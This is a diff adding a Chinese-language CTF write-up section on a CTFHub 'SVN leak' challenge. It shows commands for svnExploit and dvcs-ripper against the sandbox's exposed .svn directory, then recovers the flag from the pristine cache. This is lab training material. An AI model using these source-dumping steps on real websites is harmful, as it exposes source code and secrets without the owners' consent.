@@ -956,3 +956,120 @@ ctfhub{db36e890d8ae9388e2d950c5}
 ```
 
 提交`ctfhub{db36e890d8ae9388e2d950c5}`即可。
+
+#### SVN泄露
+
+使用 [svnExploit](https://github.com/admintony/svnExploit) 未果。
+
+```bash
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ git clone https://github.com/admintony/svnExploit.git
+
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ cd svnExploit
+
+┌──(tyd㉿Kali)-[~/ctf/svnExploit]
+└─$ python SvnExploit.py -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
+ ____             _____            _       _ _   
+/ ___|_   ___ __ | ____|_  ___ __ | | ___ (_) |_ 
+\___ \ \ / / '_ \|  _| \ \/ / '_ \| |/ _ \| | __|
+ ___) \ V /| | | | |___ >  <| |_) | | (_) | | |_ 
+|____/ \_/ |_| |_|_____/_/\_\ .__/|_|\___/|_|\__|
+                            |_|                 
+SvnExploit - Dump the source code by svn
+Author: AdminTony (http://admintony.com)
+https://github.com/admintony/svnExploit
+
+
++--------------------+----------+------------------------------------------------+
+|       文件名       | 文件类型 |                    CheckSum                    |
++--------------------+----------+------------------------------------------------+
+|     index.html     |   file   | $sha1$bf45c36a4dfb73378247a6311eac4f80f48fcb92 |
+| flag_116206259.txt |   file   |                      None                      |
++--------------------+----------+------------------------------------------------+
+```
+
+换个工具 [dvcs-ripper](https://github.com/kost/dvcs-ripper) 试试。
+
+```bash
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ git clone https://github.com/kost/dvcs-ripper.git 
+
+┌──(tyd㉿Kali)-[~/ctf]
+└─$ sudo apt-get install perl libio-socket-ssl-perl libdbd-sqlite3-perl libclass-dbi-perl libio-all-lwp-perl
+
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ ls
+hg-decode.pl  README.md   rip-cvs.pl  rip-hg.pl
+LICENSE       rip-bzr.pl  rip-git.pl  rip-svn.pl
+                                                                           
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ ./rip-svn.pl -v -u http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/.svn
+[i] Found new SVN client storage format!
+REP INFO => 1:file:///opt/svn/ctfhub:e43e7ef8-82fb-4194-9673-81c29de69c33   
+[i] Trying to revert the tree, if you get error, upgrade your SVN client!   
+已恢复“index.html”                                                          
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ ls
+hg-decode.pl  LICENSE    rip-bzr.pl  rip-git.pl  rip-svn.pl
+index.html    README.md  rip-cvs.pl  rip-hg.pl
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ ls -la                                  
+总计 104
+drwxr-xr-x 4 tyd tyd  4096  7月23日 18:03 .
+drwxr-xr-x 6 tyd tyd  4096  7月23日 18:02 ..
+drwxr-xr-x 8 tyd tyd  4096  7月23日 17:57 .git
+-rw-r--r-- 1 tyd tyd   149  7月23日 17:57 .gitignore
+-rw-r--r-- 1 tyd tyd  3855  7月23日 17:57 hg-decode.pl
+-rw-r--r-- 1 tyd tyd   221  7月23日 18:03 index.html
+-rw-r--r-- 1 tyd tyd 18027  7月23日 17:57 LICENSE
+-rw-r--r-- 1 tyd tyd  5597  7月23日 17:57 README.md
+-rwxr-xr-x 1 tyd tyd  6401  7月23日 17:57 rip-bzr.pl
+-rwxr-xr-x 1 tyd tyd  4717  7月23日 17:57 rip-cvs.pl
+-rwxr-xr-x 1 tyd tyd 15114  7月23日 17:57 rip-git.pl
+-rwxr-xr-x 1 tyd tyd  6102  7月23日 17:57 rip-hg.pl
+-rwxr-xr-x 1 tyd tyd  6157  7月23日 17:57 rip-svn.pl
+drwxr-xr-x 5 tyd tyd  4096  7月23日 18:03 .svn
+
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper]
+└─$ cd .svn   
+
+# 用curl命令访问文件检查网页中是否存在flag返回404
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
+└─$ curl http://challenge-6fa04595016447b5.sandbox.ctfhub.com:10800/flag_116206259.txt
+<html>
+<head><title>404 Not Found</title></head>
+<body>
+<center><h1>404 Not Found</h1></center>
+<hr><center>nginx/1.16.1</center>
+</body>
+</html>
+
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
+└─$ ls
+entries  format  pristine  text-base  tmp  wc.db  wc.db-journal
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn]
+└─$ cd pristine
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
+└─$ ls
+88  bf
+                                                                            
+┌──(tyd㉿Kali)-[~/ctf/dvcs-ripper/.svn/pristine]
+└─$ cd 88      
+                                                                            
+┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
+└─$ ls
+88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
+                                                                            
+┌──(tyd㉿Kali)-[~/…/dvcs-ripper/.svn/pristine/88]
+└─$ cat 88478f98805b77f701bfcc0696cfe363db0e0bf8.svn-base
+ctfhub{e99d45499cf367688c931aa2}
+```
+
+提交`ctfhub{e99d45499cf367688c931aa2}`。
+
+------
